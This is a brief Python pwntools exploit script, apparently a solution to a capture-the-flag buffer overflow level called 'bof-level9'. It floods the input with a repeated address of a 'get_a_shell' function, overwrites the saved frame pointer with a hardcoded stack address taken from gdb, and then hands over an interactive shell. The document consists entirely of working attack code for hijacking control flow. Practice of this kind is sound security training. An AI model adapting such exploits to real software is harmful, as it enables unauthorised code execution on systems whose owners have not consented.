#!/usr/bin/env python

from pwn import *

p = process('./bof-level9')

get_a_shell = 0x804852b

p.sendline(p32(get_a_shell) * 31 + p32(0xffffd490)) # ebp when using gdb: 0xffffd528

output = p.recv()
print(output)

p.interactive()
